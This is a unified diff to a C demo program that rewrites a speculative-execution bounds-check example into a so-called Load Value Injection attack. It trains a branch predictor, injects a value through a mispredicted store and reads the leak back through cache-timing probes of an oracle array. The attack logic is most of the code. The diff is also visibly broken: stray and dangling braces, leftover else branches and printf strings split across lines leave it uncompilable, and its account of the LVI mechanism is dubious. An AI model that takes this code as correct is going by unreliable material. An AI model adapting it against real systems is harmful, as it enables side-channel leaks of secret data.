@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdint.h>
 #include "encoding.h"
+#include "cache.h"
 
 #define SECRET_VAL 42    // A known value used in victim_memory for this example
 #define ARRAY_SIZE 256   // Size of arrays
@@ -8,11 +9,14 @@
 // Oracle array used for the side channel.
 // Each entry is separated by 4096 bytes (likely page size) to minimize cache set collisions.
 volatile uint8_t oracle[ARRAY_SIZE * 4096];
+volatile uint8_t lvi_guard = 1;
+volatile uint8_t injected_value = 0;
 
 // "Victim" memory from which a value might be read speculatively.
 volatile uint8_t victim_memory[ARRAY_SIZE];
 
 // "Marker" characters used to signal which speculative path was taken via the oracle array.
+static inline void touch_oracle_idx(int idx){ volatile uint8_t *p = &oracle[idx*4096]; volatile uint8_t v = *p; (void)v; }
 #define MARKER_ZERO    'a' // Corresponds to oracle index (ARRAY_SIZE - 1)
 #define MARKER_NONZERO 'z' // Corresponds to oracle index 0
 
@@ -21,12 +25,9 @@ volatile uint8_t victim_memory[ARRAY_SIZE];
  * This increases the contrast for detecting cache hits later.
  * Uses a dummy array access pattern as a simple eviction strategy.
  */
-void flushOracle() {
-    // Access a large dummy array to try to evict the oracle lines from the cache.
-    volatile uint8_t dummy[ARRAY_SIZE * 4096];
-    for (int i = 0; i < ARRAY_SIZE; i++) {
-        dummy[i * 4096] = 1; // Access spaced-out elements
-    }
+void flushOracle(){
+    flushCache((uint64_t)oracle, sizeof(oracle));
+}
 }
 
 /**
@@ -68,29 +69,22 @@ uint8_t isCachedChar(char c) {
  * The speculative path taken leaks information via the oracle array cache state.
  * @param attacker_input An index provided by the attacker. Used for the bounds check.
  */
-void victimFunctionSpeculativeInjection(uint8_t attacker_input) {
-    // Bounds check branch: Normally true if attacker_input < ARRAY_SIZE.
-    // If attacker provides an out-of-bounds index, the branch predictor might still
-    // predict 'taken' based on training.
-    if (attacker_input < ARRAY_SIZE) {
-
-        // --- Potentially executed speculatively if branch above is mispredicted ---
-
-        // Load from victim memory using the attacker-controlled (or derived) index.
-        // If attacker_input was out-of-bounds, this accesses unintended memory speculatively.
+void victimFunctionSpeculativeInjection(uint8_t attacker_input){
+    if (attacker_input < ARRAY_SIZE){
+        // Mispredicted guarded store intended to be squashed but to forward injected_value
+        if (lvi_guard){
+            victim_memory[attacker_input] = injected_value; // executes speculatively during attack
+        }
+        // Dependent load which may receive forwarded injected_value
         uint8_t spec_val = victim_memory[attacker_input];
-
-        // Speculative data-dependent branch: The path taken depends on 'spec_val'.
-        // If 'spec_val' is influenced by the speculative load above, this branch leaks information.
-        // Example: If the predictor assumes spec_val is 0 (based on training/bias),
-        // but the actual (or speculatively loaded) value is non-zero, it might speculatively
-        // execute the 'else' path.
-        if (spec_val == 0) {
-             // Path taken if spec_val is (or is speculated to be) 0.
-             // Access oracle entry corresponding to MARKER_NONZERO ('z')
-             printf("Do Not Print"); // Avoid compiler optimization, should not appear
-             oracle[0 * 4096] = MARKER_NONZERO; // Loads 'z' cache line
+        // Encode spec_val into oracle cache state
+        if (spec_val == 0){
+            touch_oracle_idx(ARRAY_SIZE - 1);
         } else {
+            touch_oracle_idx(0);
+        }
+    }
+} else {
              // Path taken if spec_val is (or is speculated to be) non-zero.
              // Access oracle entry corresponding to MARKER_ZERO ('a')
              oracle[(ARRAY_SIZE - 1)*4096] = MARKER_ZERO; // Loads 'a' cache line
@@ -99,53 +93,38 @@ void victimFunctionSpeculativeInjection(uint8_t attacker_input) {
     }
 }
 
-int main(void) {
-    // Initialize victim memory with a known non-zero value.
-    for (int i = 0; i < ARRAY_SIZE; i++) {
-        victim_memory[i] = SECRET_VAL; // SECRET_VAL is 42 (non-zero)
+int main(void){
+    // Initialize victim memory to non-zero baseline
+    for (int i=0;i<ARRAY_SIZE;i++){ victim_memory[i] = SECRET_VAL; }
+    uint64_t thr = calibrate_threshold((uint8_t*)oracle);
+
+    // Training: set guard = 1 so the store path is taken (predict taken)
+    lvi_guard = 1; injected_value = 0; // train with zero to bias inner branch too
+    printf("Training LVI gadget...
+");
+    for (int i=0;i<200;i++){
+        flushOracle();
+        victimFunctionSpeculativeInjection(i % ARRAY_SIZE);
     }
 
-    // Flush the oracle array to ensure a clean state for detection.
+    // Attack: flip guard to 0 so store is architecturally not taken; predictor will likely mispredict as taken
+    // Choose a target index; set injected_value to a non-zero marker
+    uint8_t target_idx = 7; injected_value = 0x5A; lvi_guard = 0;
+    printf("Triggering LVI...
+");
     flushOracle();
+    victimFunctionSpeculativeInjection(target_idx);
 
-    // Attacker provides an out-of-bounds index to trigger misprediction.
-    uint8_t attacker_input = ARRAY_SIZE + 10;
-
-    // Train the branch predictor:
-    // Repeatedly call the function with in-bounds indices to make the predictor
-    // learn that the 'if (attacker_input < ARRAY_SIZE)' branch is usually taken.
-    printf("Training branch predictor...\n");
-    for (int i = 0; i < 100; i++) {
-        victimFunctionSpeculativeInjection(i % ARRAY_SIZE); // Use in-bounds index
-    }
-    printf("Training complete.\n");
-
-
-    // Trigger the attack: Call with the out-of-bounds index.
-    // The outer 'if' should evaluate to false, but due to training, the processor
-    // might speculatively execute the 'if' block anyway.
-    printf("Triggering potentially mispredicted execution with out-of-bounds input...\n");
-    victimFunctionSpeculativeInjection(attacker_input);
-
-    // Check the cache state: After speculation (if any) completes,
-    // measure which oracle entry (marker) is now cached.
-    printf("\n== Post-Speculation Results ==\n");
-
-    // Check if the 'z' marker's oracle line is cached (implies spec_val == 0 path taken)
-    if (isCachedChar(MARKER_NONZERO)) { // Check for 'z'
-        printf("Speculation result: MARKER_NONZERO ('z') found in cache.\n");
-        printf("  -> Suggests the 'spec_val == 0' branch path was speculatively executed.\n");
-    // Check if the 'a' marker's oracle line is cached (implies spec_val != 0 path taken)
-    } else if (isCachedChar(MARKER_ZERO)) { // Check for 'a'
-        printf("Speculation result: MARKER_ZERO ('a') found in cache.\n");
-        printf("  -> Suggests the 'spec_val != 0' branch path was speculatively executed.\n");
-    } else {
-        printf("Speculation result: Neither marker found reliably in cache.\n");
-    }
-
-     // Since victim_memory contains 42 (non-zero), we expect the spec_val != 0 path ('a') to be cached
-     // if the outer branch mispredicts and the inner branch prediction is correct or bypassed.
-     // Finding 'z' would imply a more complex interaction or value injection scenario.
-
+    // Probe oracle
+    uint64_t t0 = measure_cycles(&oracle[0*4096]);
+    uint64_t t1 = measure_cycles(&oracle[(ARRAY_SIZE-1)*4096]);
+    printf("Oracle timing: idx0=%lu idxN=%lu (thr=%lu)
+", (unsigned long)t0, (unsigned long)t1, (unsigned long)thr);
+    if (t0 < thr) printf("Likely leaked: non-zero (injected) path.
+");
+    else if (t1 < thr) printf("Likely leaked: zero path.
+");
+    else printf("No clear leak detected.
+");
     return 0;
 }
